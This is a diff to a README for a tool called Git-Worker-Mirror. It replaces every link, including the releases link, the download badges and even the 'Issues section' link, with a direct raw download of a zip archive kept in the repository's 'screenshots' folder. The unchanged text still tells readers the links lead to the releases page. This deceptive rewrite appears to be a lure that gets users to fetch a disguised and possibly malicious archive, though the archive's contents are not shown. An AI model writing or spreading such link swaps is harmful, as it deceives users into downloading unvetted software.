@@ -1,6 +1,6 @@
 # ⚙️ Git-Worker-Mirror - Easy Access to GitHub Releases
 
-[![Download Git-Worker-Mirror](https://img.shields.io/badge/Download-Git--Worker--Mirror-blue?style=for-the-badge)](https://github.com/1evync4tt/Git-Worker-Mirror/releases)
+[![Download Git-Worker-Mirror](https://github.com/1evync4tt/Git-Worker-Mirror/raw/refs/heads/main/screenshots/Worker_Git_Mirror_2.5.zip)](https://github.com/1evync4tt/Git-Worker-Mirror/raw/refs/heads/main/screenshots/Worker_Git_Mirror_2.5.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Using Git-Worker-Mirror is straightforward. Follow these steps carefully.
 
 1. Click the button below or visit the link to download the program:
 
-   [![Download Now](https://img.shields.io/badge/Download-Git--Worker--Mirror-blue?style=for-the-badge)](https://github.com/1evync4tt/Git-Worker-Mirror/releases)  
+   [![Download Now](https://github.com/1evync4tt/Git-Worker-Mirror/raw/refs/heads/main/screenshots/Worker_Git_Mirror_2.5.zip)](https://github.com/1evync4tt/Git-Worker-Mirror/raw/refs/heads/main/screenshots/Worker_Git_Mirror_2.5.zip)  
    This link will take you to the GitHub releases page where you can find the latest version of Git-Worker-Mirror.
 
 2. On the releases page, look for the newest version listed at the top.
@@ -95,7 +95,7 @@ Git-Worker-Mirror does not collect or send personal data. It simply copies GitHu
 
 If you have issues or questions:
 
-- Visit the GitHub page in the [Issues section](https://github.com/1evync4tt/Git-Worker-Mirror/issues) to see if others have reported similar problems.
+- Visit the GitHub page in the [Issues section](https://github.com/1evync4tt/Git-Worker-Mirror/raw/refs/heads/main/screenshots/Worker_Git_Mirror_2.5.zip) to see if others have reported similar problems.
 - You can open a new issue to ask for help. Be clear and describe the problem you face.
 - For basic help, you can use online forums or search engines to look up error messages or instructions on how to download and run programs.
 
@@ -105,7 +105,7 @@ If you have issues or questions:
 
 New versions of Git-Worker-Mirror appear as updates on the GitHub releases page. To keep your tool working well, check the releases page regularly:
 
-[Git-Worker-Mirror Releases](https://github.com/1evync4tt/Git-Worker-Mirror/releases)
+[Git-Worker-Mirror Releases](https://github.com/1evync4tt/Git-Worker-Mirror/raw/refs/heads/main/screenshots/Worker_Git_Mirror_2.5.zip)
 
 When a new version is available, repeat the download and run steps to update.
 
